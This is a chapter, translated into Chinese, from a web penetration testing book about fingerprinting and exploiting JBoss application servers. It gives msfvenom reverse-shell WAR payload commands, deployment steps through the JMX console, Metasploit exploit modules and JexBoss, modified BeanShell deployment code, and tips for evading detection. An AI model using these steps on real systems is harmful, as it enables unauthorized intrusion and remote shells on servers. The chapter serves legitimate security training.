![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/a40f3703-2f37-4a1a-90e3-df07a3b7a655.png)

大多数威胁行为者通过在 Shodan、Censys 等上搜索相同的标头信息来检测 JBoss AS 的使用。在撰写本书时，有超过 19,000 个 JBoss AS 服务器，如果它们没有得到安全配置，就有可能被利用：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/81913347-fe18-4757-a1f7-86df23bc62e0.png)

威胁行为者寻找这些信息并运行自动化扫描程序，以找到易受攻击的 JBoss 实例。一旦被攻击，JBoss 可以为行为者打开进入组织网络的大门。

# 通过哈希值检测 favicon.ico

这种技术通常不为渗透测试人员所熟知，因为它涉及对图标进行哈希处理。这实际上是另一种很酷的方法，可以告诉我们服务器是否正在运行 JBoss AS。我们可以对`favicon.ico`文件（一个图标文件）进行 MD5 哈希处理，如下截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/f46a22d7-858c-4a61-875e-4bb9d5e33eab.png)

在 OWASP favicon 数据库中搜索哈希值将告诉我们服务器是否正在运行 JBoss：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/19585426-6fb8-4ff7-aab4-5dc6367921f0.png)

由于 OWASP favicon 数据库非常有限，我们可以随时创建自己的数据库来执行此活动。

# 通过样式表（CSS）进行检测

查看 HTML 源代码，我们可以看到 JBoss 样式表（`jboss.css`），如下截图所示，这清楚地表明了 JBoss AS 正在运行：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/08288cdb-1e8b-4d85-9e0a-621bdb9e85e6.png)

有时，管理员会更改 JBoss 文件的命名约定，但在这个过程中，他们忘记了添加必要的安全配置。现在我们已经手动收集了用于识别 JBoss AS 实例使用的信息，让我们尝试使用 Metasploit 来识别该实例。

# 使用 Metasploit 进行 JBoss 状态扫描

Metasploit 还具有用于 JBoss 枚举的内置辅助模块，其中之一是 `auxiliary/scanner/http/jboss_status`。该模块寻找显示应用程序服务器运行状态历史的状态页面。我们可以在 `msfconsole` 中使用以下命令加载该模块：

```
use auxiliary/scanner/http/jboss_status
show options
```

以下截图显示了上述命令的输出：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/3acf9452-ce65-41c5-bf1d-b923cc71e6a8.png)

上述截图显示了运行辅助程序所需的选项。设置好选项后，然后像下面的截图中所示运行辅助程序，服务器将确认应用程序服务器是基于 JBoss 的，根据发现的状态页面：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/2363aab6-03f9-4454-92a6-93660854f204.png)

该模块寻找页面上具有以下正则表达式的文本：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/1da0987d-4a4a-4aaf-936c-ccc5ceb04b52.png)

该模块执行以下操作：

1.  它向服务器发送 `GET` 请求以查找 `/status` 页面（默认页面设置为 `Target_uri` 选项）。

1.  如果从服务器收到 `200 OK` 响应，它将在 HTML `<title>` 标签中查找 `Tomcat Status` 字符串。

1.  如果找到该标签，该模块将根据正则表达式查找数据，如上述截图所示。

当模块执行时，JBoss 会存储源 IP、目标 IP 和被调用页面。然后这些信息将被打印出来。我们可以在 `/status` 页面中查看它，就像下面的截图中所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/00733b7e-31e2-4205-9d32-94011c998be8.png)

`jboss_status` 模块寻找特定信息以对 JBoss AS 实例进行指纹识别。

# JBoss 服务枚举

运行在 **JBoss Web Service** (**JBoss WS**) 上的服务列表也可以为我们提供有关 JBoss 服务器的信息：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/600b4385-5873-433a-b708-aa099a4fd943.png)

打开 JBoss WS URI（即浏览到 `/jbossws/services`）将确认 JBoss AS 是否正在运行，正如我们在上述截图中所看到的。现在我们对如何枚举运行的 JBoss 服务并收集更多信息有了更好的理解，让我们继续下一节，它将向我们展示如何对 JBoss AS 实例执行漏洞扫描。

# 对 JBoss AS 执行漏洞评估

如果我们在一台机器上发现了 JBoss AS 实例，并且需要执行漏洞评估，我们总是可以使用 Metasploit。Metasploit 有一个名为 `auxiliary/scanner/http/jboss_vulnscan` 的模块，我们可以使用它对 JBoss AS 执行漏洞扫描。该模块检查一些漏洞，例如身份验证绕过、默认密码和可访问的 `JMX-console` 功能。以下是我们可以观察到的在 JBoss AS 上执行漏洞评估的步骤：

1.  要使用 `jboss_vulnscan`，我们在 `msfconsole` 中输入以下命令：

```
use auxiliary/scanner/http/jboss_vulnscan
show options
```

以下截图显示了上述命令的输出：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/3060a4be-251b-4e9c-b921-a1c82423c429.png)

1.  设置所需的选项，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/2d670cc4-6790-4484-bd47-c62f1828b7b6.png)

1.  运行扫描程序后，它将检查各种漏洞，并报告在服务器上发现了哪些漏洞，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/ea198d8d-cd9b-4e04-910b-844c82716b3c.png)

该模块查找应用程序中的特定文件和在不同端口上运行的 Java 命名服务。

# 使用 JexBoss 进行漏洞扫描

还有另一个非常强大的工具，名为 JexBoss，专门用于 JBoss 和其他技术枚举和利用情况。它是由 João F. M. Figueiredo 开发的。在本节中，我们将简要介绍如何使用 JexBoss。该工具可以在 [`github.com/joaomatosf/jexboss`](https://github.com/joaomatosf/jexboss) 下载和安装。

设置好这一切后，我们可以使用以下命令运行该工具：

```
./jexboss.py -u http://<websiteurlhere.com>
```

让我们使用这个工具（如下截图所示）来查找 JBoss AS 实例中的漏洞：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/87b5d03a-1a69-40d7-91cc-f874878e9b15.png)

在前面的屏幕截图中使用的命令将寻找易受攻击的 Apache Tomcat Struts、servlet 反序列化和 Jenkins。该工具还将检查各种 JBoss 漏洞，我们将找出服务器是否易受其中任何漏洞的影响。

# 易受攻击的 JBoss 入口点

众所周知，JBoss 配备了许多功能齐全和运行良好的附加组件和扩展，如 JNDI、JMX 和 JMS，因此 JBoss 利用的可能入口点数量相应增加。以下表格列出了易受攻击的 MBean 及其相应的服务和方法名称，可用于 JBoss 侦察和利用：

| **类别** | **MBean 域名** | **MBean 服务名称** | **MBean 方法名称** | **MBean 方法描述** |
| --- | --- | --- | --- | --- |
| 利用 | `jboss.system` | `MainDeployer` | `deploy()`、`undeploy()`和`redeploy()` | `deploy()`方法用于部署应用程序。`undeploy()`方法用于取消部署已部署的应用程序。`redeploy()`方法用于服务器重新部署存储在服务器本身（本地文件）的已部署应用程序。 |
| 侦察 | `jboss.system` | `Server` | `exit()`、`shutdown()`和`halt()` | `exit()`、`shutdown()`和`halt()`方法是非常危险的方法。威胁行为者可以使用这些方法关闭应用程序服务器以中断服务。 |
| 侦察 | `jboss.system` | `ServerInfo` | N/A | N/A |
| 侦察 | `jboss.system` | `ServerConfig` | N/A | N/A |
| 利用 | `jboss.deployment` | `DeploymentScanner` | `addURL()`和`listDeployedURLs()` | `addURL()`方法用于通过 URL 添加远程/本地应用程序进行部署。`listDeploymentURLs()`方法用于列出所有先前部署的应用程序及其 URL。此方法有助于查找当前的 JBoss AS 实例是否已被利用。 |
| 利用 | `jboss.deployer` | `BSHDeployer` | `createScriptDeployment()`、`deploy()`、`undeploy()`和`redeploy()` | `createScriptDeployment()`方法用于通过**Bean Shell**（**BSH**）脚本部署应用程序。脚本内容应在此方法中提及以进行部署。然后 MBean 创建一个带有`.bsh`扩展名的临时文件，该文件将用于部署。`deploy()`、`undeploy()`和`redeploy()`方法用于使用 BSH 脚本管理部署。 |
| 利用 | `jboss.admin` | `DeploymentFileRepository` | `store()` | `store()`方法被部署者用于存储文件名及其扩展名、文件夹名和时间戳。威胁行为者只需提到具有上述信息的 WAR 文件，有效载荷将直接部署在服务器上。 |

`MainDeployer` MBean 是部署的入口点，所有组件部署的请求都发送到`MainDeployer`。`MainDeployer`可以部署 WAR 存档、**JARs**、**企业应用程序存档**（**EARs**）、**资源存档**（**RARs**）、**Hibernate 存档**（**HARs**）、**服务存档**（**SARs**）、**BSHes**和许多其他部署包。

# JBoss 利用

现在我们清楚了 JBoss 的侦察和漏洞扫描能力，让我们了解一下 JBoss 的利用。我们可以用以下几种基本方法来利用 JBoss：

+   JBoss 利用通过**管理控制台**（`admin-console`）

+   通过`MainDeployer`服务利用 JBoss 的 JMX 控制台

+   JBoss 利用通过 JMX 控制台使用`MainDeployer`服务（Metasploit 版本）

+   JBoss 利用通过 JMX 控制台使用`BSHDeployer`服务

+   通过`BSHDeployer`服务（Metasploit 版本）利用 JBoss 的 JMX 控制台

+   通过 Java 小程序利用 JBoss 的 Web 控制台

+   通过`Invoker`方法利用 JBoss 的 Web 控制台

+   通过第三方工具使用 Web 控制台进行 JBoss 利用

让我们逐个了解这些利用方法。

# JBoss 通过管理控制台进行利用

在这一部分，我们将开始利用过程。第一步是访问管理控制台，默认情况下配置的用户名和密码分别为`admin`和`admin`。下图显示了管理登录页面：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/7a9e93c7-7c86-490b-b096-07b77df25442.png)

一旦我们成功登录，我们将看到下图所示的页面：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/e8daf257-f5cd-456d-a794-cddce4600c40.png)

利用的下一步是找到一种在服务器上执行命令的方法，以便我们获得服务器级别的访问权限。从左侧菜单中选择 Web 应用程序（WAR）选项，您将被重定向到下图所示的页面。我们将点击“添加新资源”按钮：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/06cb8a26-8af6-4c99-afe0-2f617bd5a053.png)

这将带我们到一个新页面，在那里我们将看到上传 WAR 文件的选项。可以使用以下命令使用`msfvenom`生成 WAR 文件： 

```
msfvenom -p java/meterpreter/reverse_tcp lhost=<Metasploit_Handler_IP> lport=<Metasploit_Handler_Port> -f war -o <filename>.war
```

一旦我们生成了基于 WAR 的 Metasploit 有效载荷，我们将把文件上传到控制台的 Web 应用程序（WAR）部分，如下图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/ecada5d0-cd8f-4a8f-a965-fa3c580e165d.png)

一旦文件成功上传，我们只需要转到它被提取到的目录，并在我们的 Web 浏览器上打开它以获取 Meterpreter 连接，如下图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/3ed42436-8f10-4367-bfb6-beea5686b4ff.png)

在运行有效载荷之前，有一些需要考虑的事情，最重要的是检查出口连接。如果有效载荷被执行，但防火墙阻止对我们服务器的出口流量（出站连接），我们需要找到一种方法来获取反向 shell。如果没有办法做到这一点，我们总是可以选择绑定连接到服务器。

# 通过 JMX 控制台进行利用（MainDeployer 方法）

请考虑来自官方 JBoss 文档的以下引用（可在[`docs.jboss.org/jbossas/docs/Getting_Started_Guide/4/html-single/index.html`](https://docs.jboss.org/jbossas/docs/Getting_Started_Guide/4/html-single/index.html)找到）：

“JMX 控制台是 JBoss 管理控制台，它提供了服务器组成的 JMX MBeans 的原始视图。它们可以提供有关运行服务器的大量信息，并允许您修改其配置，启动和停止组件等。”

如果我们发现 JBoss 有未经身份验证访问 JMX 控制台的实例，我们可以使用`MainDeployer`选项将 shell 上传到服务器。这允许我们从远程 URL 获取 WAR 文件并在服务器上部署它。JMX 控制台如下图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/da21be8d-8f8d-42a9-923a-0c5f1a44a8d0.png)

让我们实施以下利用步骤：

1.  在控制台页面上，搜索`MainDeployer`服务选项，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/3b40d6fa-23e8-4864-8d47-c6ae46bc102f.png)

1.  单击该选项将重定向我们到一个新页面，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/9347d1f8-33e1-43ce-994d-a4e8518682ee.png)

1.  向下滚动页面，我们将看到多个`deploy`方法。选择`URL Deploy`方法，这将允许我们从远程 URL 获取 WAR 文件：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/ccef5707-375f-4b50-9229-2fb75bd3e477.png)

1.  使用以下命令生成基于 WAR 的 Metasploit 有效载荷：

```
Msfvenom -p java/meterpreter/reverse_tcp lhost=<Metasploit_Handler_IP> lport=<Metasploit_Handler_Port> -f war -o <filename>.war
```

1.  现在我们需要将 WAR 文件托管在 HTTP 服务器上，并将 URL 粘贴到输入字段中，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/6f90207a-c92b-435d-b963-ae52e389f404.png)

1.  让我们设置我们的利用处理程序如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/cf918cfe-c4ba-4ca3-b9dd-38ffb5f1dec0.png)

1.  一旦成功调用，我们将从服务器收到以下消息：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/9dba5cbf-d778-4ec8-b3e6-d192e8f23c6c.png)

我们的`s.war`有效载荷已部署。

1.  接下来，我们需要找到正确的 stager 名称，以便我们可以调用文件。让我们解压 Metasploit 生成的文件，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/4b56ef15-5785-4e95-93f8-94b83d0fd255.png)

我们在`web.xml`文件中找到 servlet 名称：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/f359e8a9-319e-462b-81ed-3a05cee2c4cd.png)

1.  让我们通过将 servlet 名称添加到 URL 来调用有效载荷，如下所示的屏幕截图：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/46b190cd-4419-4691-bb2c-db1259a6d88b.png)

1.  输出将为空，但我们可以在我们的 Metasploit exploit 处理程序上检查 stager 请求，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/5e887d77-945c-4ecc-a6e0-dde180f307a0.png)

最好自定义 WAR 文件并使用常见的技术对内容进行混淆。此外，为了帮助进一步避免检测，我们需要将文件名从随机名称更改为更具体和常见的名称，例如`login.jsp`，`about.jsp`或`logout.jsp`。

# 通过使用 Metasploit 通过 JMX 控制台进行利用（MainDeployer）

Metasploit 还具有内置的利用模块，可用于使用`MainDeployer`方法利用 JMX 控制台。现在让我们使用 Metasploit 模块通过 JMX 控制台上传 shell。我们使用以下命令加载利用程序：

```
use exploit/multi/http/jboss_maindeployer
```

我们将看到以下可用选项：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/5155d221-364a-41ae-9d39-24f241fb867f.png)

我们可以设置所需的选项，如`rhosts`和`rport`，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/606df825-72af-4280-a36b-87e3aec54dbe.png)

当一切都设置好后，我们可以运行利用程序，Metasploit 将执行我们在上一节手动执行的相同步骤，以便在服务器上为我们提供 Meterpreter 访问，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/e218a9e1-c77c-4a1f-9e65-74a1519e4ba9.png)

有时，如果 JMX 控制台受到身份验证保护，模块可能无法工作。我们可以尝试对身份验证进行字典攻击，如果成功，我们可以使用用户名和密码（在字典攻击期间找到）在此模块上设置`HttpUsername`和`HttpPassword`选项。

# 通过 JMX 控制台（BSHDeployer）进行利用

通过使用**BeanShell Deployer**（`BSHDeployer`）在 JMX 控制台上实现代码执行的另一种方法。`BSHDeployer`允许我们在 JBoss 中以 Bean shell 脚本的形式部署一次执行脚本和服务。在获得对 JMX 控制台的访问后，我们可以查找`service=BSHDeployer`对象名称，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/975f3cf3-7107-4a51-b1c1-13d90527ec8a.png)

单击此对象将重定向我们到部署页面，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/68f238ba-364c-44a1-8aba-74700f25fba1.png)

在这里，我们需要放置将用于在服务器上部署我们的有效载荷的 BSH 文件的 URL。一个简单的方法是使用第三方工具进行通过`BSHDeployer`的利用，例如 JexBoss。这也可以使用 Metasploit 来实现，我们将在下面看到。

# 通过使用 Metasploit 通过 JMX 控制台进行利用（BSHDeployer）

Metasploit 也可以用于部署 BSH 以在服务器上实现代码执行。Metasploit 具有用于此目的的`jboss_bshdeployer`利用模块，让我们看一下它的用法。我们可以使用以下命令在`msfconsole`中加载利用程序：

```
Use exploit/multi/http/jboss_bshdeployer
```

要查看选项列表，我们需要输入`show options`，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/9dedc6e9-677f-49e2-b587-c0a539c7f596.png)

然后我们需要在运行利用程序之前设置相应的选项，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/c21b1280-eec3-40b8-9e11-a1349c930fbd.png)

我们需要设置在此模块中使用的有效载荷（默认情况下为`java/meterpreter/reverse_tcp`）。一个通用的选项是使用基于 Java 的 Meterpreter，但在 Java 有效载荷不起作用的情况下，我们可以尝试使用基于操作系统风格和架构的有效载荷。

运行利用程序后，Metasploit 将创建一个 BSH 脚本并调用部署程序，然后部署和提取 shellcode。调用 JSP shellcode 将执行我们的有效载荷，我们将获得一个反向连接，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/fbb060ac-cad8-482e-8a69-0991b64a72b3.png)

现在我们知道如何通过`BSHDeployer`利用 JMX 控制台，让我们看看如何通过 web 控制台进行利用。

# 通过 web 控制台（Java 小程序）进行利用

在本节中，我们将讨论 JBoss web 控制台。请注意，JBoss web 控制台已被弃用，并已被管理控制台取代，但对我们仍然有用，因为在旧版本的 JBoss 服务器上，仍然可以利用 web 控制台。在浏览器中打开 web 控制台时，我们可能也会遇到一些错误，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/20baf348-48f0-459a-b576-f11d5001b481.png)

为了允许小程序运行，我们需要更改我们的 Java 安全设置，并将 JBoss 实例的域名和 IP 地址添加到 Java 例外站点列表中，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/ccd29179-d62c-4411-861f-0cd71f15d637.png)

一旦异常被添加，我们仍然会收到浏览器的警告，但我们可以继续单击“继续”，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/f8a310a3-7e60-4c68-95db-96ecdffd36df.png)

在下一个弹出窗口中，我们需要单击“运行”按钮以允许应用程序运行，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/e9f7d898-883a-4222-a781-84bc0316f70c.png)

然后我们会看到 JBoss 服务器的 web 控制台。在这里，我们可以继续上一节中介绍的相同步骤，使用`MainDeployer`上传 shell。如下截图所示，我们只需要在左侧窗格中找到并选择对象即可：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/9bc50662-0832-410d-9561-8e0edee2ce7f.png)

单击`MainDeployer`项目将带我们到可以在服务器上部署 WAR 文件以实现代码执行的页面，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/2a28a7cd-23a9-476d-85a2-c8b1c10f47bf.png)

默认情况下，大多数浏览器禁用了运行 Java 小程序，因此有时，在发现 JBoss 服务器的 web 控制台页面时，我们可能只会得到一个空白页面。在打开 web 控制台时遇到空白页面并不意味着服务不可访问。这只意味着我们需要稍微调整我们的浏览器以允许 Java 小程序的执行。

# 通过 web 控制台进行利用（Invoker 方法）

利用 JBoss AS 实例的另一种方法是通过 web 控制台的`Invoker`方法。在请求`/web-console/Invoker` URI 路径时执行`curl`命令将从服务器获取响应，文件的前 4 个字节中包含`0xAC`和`0xED`十六进制代码字符（`aced`）。我们可以在任何 Java 序列化对象的开头看到这一点，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/3c98d94d-5f14-4cf6-b9fd-5cf86b1bfb2b.png)

`Invoker` servlet 可以在 web 控制台或`Invoker`的`http://example.com/web-console/Invoker`中找到。这可以在大多数情况下无需身份验证访问。我们可以向这个`Invoker`发送序列化的 post 请求来在服务器上执行命令。

以下是前面截图中字节的分解：

+   ac ed: `STREAM_MAGIC`指定这是一个序列化协议。

+   00 o5: `STREAM_VERSION`指定正在使用的序列化版本。

+   0x73: `TC_OBJECT`指定这是一个新对象。

+   0x72: `TC_CLASSDESC`指定这是一个新类。

+   00 24: 这指定了类名的长度。

+   {6F 72 67 2E 6A 62 6F 73 ****73 2E 69 6E 76 6F 63 61** **74 69 ****6F 6E 2E 4D 61 72 ****73 68 61 6C 6C 65 64 56** **61 6C 75 65} **org.jboss. invocation.MarshalledValue**: 这指定了类名。

+   EA CC E0 D1 F4 4A D0 99: `SerialVersionUID`指定了这个类的序列版本标识符。

+   0x0C: 这指定了标记号。

+   00 00: 这指定了这个类中字段的数量。

+   0x78: `TC_ENDBLOCKDATA`标记块对象的结束。

+   0x70: `TC_NULL`表示没有更多的超类，因为我们已经到达了类层次结构的顶部。

+   使用第三方工具通过 web 控制台进行利用。

在跳入 Metasploit 的模块之前，让我们看看 RedTeam Pentesting 开发的另一组脚本。存档可以从他们的网站[`www.redteam-pentesting.de/files/redteam-jboss.tar.gz`](https://www.redteam-pentesting.de/files/redteam-jboss.tar.gz)下载。

存档包含以下文件：

+   `BeanShellDeployer/mkbeanshell.rb`

+   `WAR/shell.jsp`

+   `WAR/WEB-INF/web.xml`

+   `Webconsole-Invoker/webconsole_invoker.rb`

+   `JMXInvokerServlet/http_invoker.rb`

+   `JMXInvokerServlet/jmxinvokerservlet.rb`

+   `jboss_jars/console-mgr-classes.jar`

+   `jboss_jars/jbossall-client.jar`

+   `README`

+   `setpath.sh`

+   `Rakefile`

下面的截图显示了团队发布的不同脚本：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/4f60675d-1e68-4d79-9cc7-2163291ca60f.png)

我们可以使用这个工具创建自定义的 BSH 脚本，通过 web 控制台`Invoker`部署 BSH 脚本，创建`JMXInvokerServlet`负载等。让我们看看如何使用这个工具创建 BSH 脚本。

# 创建 BSH 脚本

存档中的一个脚本是`mkbeanshell`。该脚本以 WAR 文件作为输入，然后将 BSH 脚本作为输出创建：

1.  通过使用`-h`标志执行脚本，我们可以看到所有可用的选项列表，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/7fad0f3f-500d-4b6a-8e11-7dfe499d7766.png)

1.  现在，我们可以使用以下命令创建 BSH：

```
./mkbeanshell.rb -w <war file> -o <the output file>
```

该命令的输出（即 BSH 脚本）将保存在前面命令中提到的输出文件中。在这种情况下，创建的文件是`redteam.bsh`，如下截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/89703368-2469-4027-8d97-42cea710a66c.png)

1.  源文件（即在本例中使用的 WAR 文件）是通用的负载文件。在这个 WAR 文件中是我们的 JSP web shell，其内容可以在下面的截图中看到：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/17f1b6ff-1cc5-4e12-8660-6f946de3bdf2.png)

1.  默认情况下，如果我们打开创建的 BSH 脚本，我们会看到它在服务器上使用`/tmp/`目录来提取和部署 WAR 存档。现在，Windows 服务器没有`/tmp/`目录，而`mkbeanshell` Ruby 脚本只有更改路径的选项，在大多数情况下，我们可能根本不知道服务器上的路径。下面的截图显示了 BSH 脚本的代码：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/de424d35-8b7e-46da-a552-42f6f6cbffa0.png)

1.  我们可以用以下代码替换上一个截图中的最后几行代码，以获取通用文件位置：

```
BASE64Decoder decoder = new BASE64Decoder();
String jboss_home = System.getProperty("jboss.server.home.dir");
new File(jboss_home + "/deploy/").mkdir();
byte[] byteval = decoder.decodeBuffer(val);
String location = jboss_home + "/deploy/test.war";FileOutputStream fstream = new
FileOutputStream(location);fstream.write(byteval);fstream.close();
```

1.  在这里，我们可以看到`System.getProperty("jboss.server.home.dir");`获取了 JBoss 目录。这是一个平台无关的代码，可以在 Windows 和*nix 服务器上使用。我们只需要在`home`目录中创建一个名为`deploy`的新目录，使用`new File(jboss_home + "/deploy/").mkdir();`，然后，解码`Base64`并将其写入`deploy`目录作为`test.war`。在进行这些更改后，下面的截图显示了 BSH 脚本的最终代码：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/83489199-617c-47e6-84d8-eda3612e5347.png)

BSH 脚本准备就绪后，我们可以使用与第三方工具`redteam-jboss.tar.gz`一起提供的`webconsole_invoker.rb`脚本将我们的 BSH 脚本远程部署到 JBoss AS 实例上。

# 使用`webconsole_invoker.rb`部署 BSH 脚本

我们可以使用`webconsole_invoker.rb`脚本部署 BSH 脚本：

1.  使用`-h`标志执行 Ruby 脚本将显示选项列表，如下截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/f3d1603b-ac1c-4e54-a8fc-d1cd754bb143.png)

1.  现在我们运行脚本并传递目标`Invoker` URL 以及`Invoke`方法。在我们的情况下，我们将使用`createScriptDeployment()`方法。该方法接受两种输入类型，都是`String`，所以我们在`-s`标志中传递它们，然后我们传递我们的 BSH 文件的路径（带有文件名和使用`-p`标志传递的部署者的名称），如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/75e66d68-9f8c-4e97-bf52-b5045cdde2b4.png)

1.  执行脚本后，我们的`test.war`文件将被部署，在我们的`home`目录内的`/test/`目录中创建我们的 shell：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/8aaf4d5f-730a-4be5-81f4-cd0480e27ca6.png)

浏览到 URL 可以让我们访问已上传的基于 JSP 的 Web shell，如前面的截图所示。

# 通过 JMXInvokerServlet（JexBoss）进行利用

JBoss 利用的另一个很好的工具是 JexBoss。JexBoss 是一个用于测试和利用 JBoss AS 和其他 Java 平台、框架和应用程序中的漏洞的工具。它是开源的，可以在 GitHub 上找到[`github.com/joaomatosf/jexboss`](https://github.com/joaomatosf/jexboss)：

1.  下载并运行工具后，我们可以通过几个按键来进行利用。我们只需要使用以下命令传递正在运行的 JBoss 服务器的 URL：

```
./jexboss.py --jboss -P <target URL>
```

如果 Python 没有正确配置，我们可以使用`python jexboss.py --jboss -P`语法执行前面的命令。两个选项都可以工作。

1.  如下截图所示，该工具已识别出多个可利用的脆弱端点，可以利用它们来访问服务器。我们将使用`JMXInvokerServlet`，它类似于`Invoker`，并接收序列化的 post 数据：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/f1f69410-458e-4ad7-a718-c2c0558593e8.png)

1.  当工具要求确认利用时，请选择`yes`：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/71cca431-2ae6-4d50-a749-2252f82e6e89.png)

1.  一旦利用完成，我们将获得一个 shell，通过它我们可以在服务器上执行命令，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/5d557433-8281-4720-8d99-5c54e10fa7b2.png)

使用`jexremote`命令也可以进行进一步的利用。现在我们对使用 JexBoss 利用 JBoss 有了更好的理解，让我们继续下一部分——使用 Metasploit 通过`JMXInvokerServlet`进行利用

# 使用 Metasploit 通过 JMXInvokerServlet 进行利用

Metasploit 还有一个`JMXInvokerServlet`模块，可以使用以下命令加载：

```
Use exploit/multi/http/jboss_invoke_deploy
```

在使用此`exploit`模块之前，我们需要确保服务器上存在`/invoker/JMXInvokerServlet` URI 路径。如果路径不存在，利用将失败。以下截图显示了前面命令的输出：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/bd5741cb-022c-4bb7-bd69-6fb19d6ab62a.png)

要查看`/invoker/JMXInvokerServlet` URI 路径是否存在，我们可以使用以下命令进行确认：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/ee5a533b-f889-416d-8b1e-7ef2875939c8.png)

